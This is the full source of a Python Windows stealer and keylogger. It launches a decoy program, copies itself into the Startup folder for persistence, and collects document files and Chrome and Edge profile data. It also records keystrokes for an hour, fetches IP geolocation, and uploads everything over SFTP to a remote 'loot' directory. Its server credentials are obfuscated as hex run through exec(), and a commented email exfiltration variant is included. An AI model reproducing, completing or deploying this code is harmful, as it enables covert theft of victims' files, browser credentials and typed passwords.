import os
import sys

os.startfile(r'C:\Windows\System32\SnippingTool.exe')

user = os.path.expanduser('~')
lockfilepath = os.path.join(user, "lockfile.lock")

if os.path.exists(lockfilepath):
    sys.exit(1)
with open(lockfilepath, "w"):
    pass

### persistence ###
import shutil

def startup():
    startfolder = rf"{os.getenv("APPDATA")}\Microsoft\Windows\Start Menu\Programs\StartUp\\"
    try:
        shutil.copy(sys.argv[0], startfolder)
    except shutil.SameFileError:
        pass

### imports ###
import time
import threading
import py7zr
import requests
import paramiko
from datetime import datetime
from pynput import keyboard

### exfiltration ###
def sftp_func(filepath):

    # pass, user, ip > to hex > escape unicode chars
    # b = "<remote ssh password>"
    # a = "<remote ssh username>"
    # c = "<server ip>"

    l = "\u0036\u0032\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0030\u0036\u0031\u0037\u0033\u0037\u0033\u0037\u0037\u0036\u0066\u0037\u0032\u0036\u0034\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0031\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0032\u0036\u0035\u0036\u0064\u0036\u0066\u0037\u0034\u0036\u0035\u0032\u0030\u0037\u0033\u0037\u0033\u0036\u0038\u0032\u0030\u0037\u0035\u0037\u0033\u0036\u0035\u0037\u0032\u0036\u0065\u0036\u0031\u0036\u0064\u0036\u0035\u0033\u0065\u0032\u0032\u0030\u0061\u0036\u0033\u0032\u0030\u0033\u0064\u0032\u0030\u0032\u0032\u0033\u0063\u0037\u0033\u0036\u0035\u0037\u0032\u0037\u0036\u0036\u0035\u0037\u0032\u0032\u0030\u0036\u0039\u0037\u0030\u0033\u0065\u0032\u0032"
    
    success = False
    while success == False:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # pub_key = os.path.join(os.path.dirname(sys.argv[0]), "id_ed25519.pub")
            exec(bytes.fromhex(l), globals())
            client.connect(c, 22, a, b, timeout=4)
            sftp = client.open_sftp()

            destination_path = f'/home/{a}/loot/{os.path.basename(filepath)}'
            sftp.put(filepath, destination_path)
            success = True
            
        except paramiko.ssh_exception.NoValidConnectionsError:
            pass
        except OSError:
            pass
        
    sftp.close()
    client.close()
    os.remove(filepath)


    ''' with email '''
    # def smtp_func(filepath):

    #     inbox_name = 'emailname@domain.com'
    #     inbox_pword = 'password'

    #     msg = EmailMessage()
    #     msg['Subject'] = f"{os.path.basename(filepath)}"
    #     msg['From'] = inbox_name
    #     msg['To'] = inbox_name

    #     # attachment not text
    #     msg.set_content(attachment)

    #     try:
    #         with smtplib.SMTP("smtp.domain.com", 587) as s:
    #             s.starttls()
    #             s.login(inbox_name, inbox_pword)
    #             s.send_message(msg)
    #     except:
    #         print("failed")

### get files ###
def collect_files():
    paths_list = [os.path.join(user, "Documents"),
                  os.path.join(user, "Desktop"),
                  os.path.join(user, "Downloads")]

    zipPath = os.path.join(user, "dogs.7z")

    for x in paths_list:
        if not os.path.exists(x):
             paths_list.remove(x)

    filelist = []

    while len(paths_list) > 0:
        cur_path = paths_list.pop()
        if "My Videos" in cur_path or "My Music" in cur_path or "My Pictures" in cur_path:
            continue
        elif os.path.isdir(cur_path):
            for child in os.listdir(cur_path):
                    paths_list.append(os.path.join(cur_path, child))
        elif cur_path.lower().endswith(('.txt', '.xlsx', '.pdf', '.docx')):
            filelist.append(cur_path)

    for browser in ['Google', 'Edge']:
        default = rf"{os.getenv("LOCALAPPDATA")}\Microsoft\{browser}\User Data\Default"
        if os.path.exists(default):
            for x in os.listdir(default):
                if not os.path.isdir(os.path.join(default, x)):
                    filelist.append(os.path.join(default, x))

    with py7zr.SevenZipFile(zipPath, "w") as archive:
        for a in filelist:
            archive.write(a)
            
    sftp_func(zipPath)

### geolocation/IP info ###
def iplocate():
    try:
        url = 'https://ipinfo.io/json'
        response = requests.get(url, verify = True)

        if response.status_code != 200:
            return None
        
        data = response.json()
        data.pop("readme")

    except requests.exceptions.ConnectionError:
        data = {"Request Status": "Failed"}

    ipinfopath = os.path.join(user, "ipinfo.txt")

    with open(ipinfopath, "w") as ipinfo:
        for x in data.keys():
            ipinfo.write(f"{x}: {data[x]}\n")

    sftp_func(ipinfopath)

### capture keys ###
def capture_keys():
    startTime = datetime.now().strftime("%d/%m/%Y %I:%M")
    text = ""

    def on_press(key):
        nonlocal text
        try:
            text += ('{0}'.format(key.char))
        except AttributeError:
            if key == keyboard.Key.backspace:
                text = text[0:-1]
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.enter:
                text += "\n"
##            elif key == keyboard.Key.esc:
##                return False

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(3600)
    listener.stop()

    endTime = datetime.now().strftime("%I:%M %p")
    timestamp = f'>> {startTime}-{endTime} <<\n'

    keyfilepath = os.path.join(user, "keylog.txt")
    with open(keyfilepath, "w") as keyfile:
        keyfile.write(timestamp)
        keyfile.write(text)
        keyfile.write('\n')

    sftp_func(keyfilepath)
    

if __name__ == "__main__":
    
    try:
        startup()
        t1 = threading.Thread(target=collect_files)
        t2 = threading.Thread(target=capture_keys)
        t3 = threading.Thread(target=iplocate)

        threads = [t1, t2, t3]
        for thread in threads:
            # thread.daemon = True
            thread.start()
        
        for thread in threads:
            thread.join()

    finally:
        os.remove(lockfilepath)
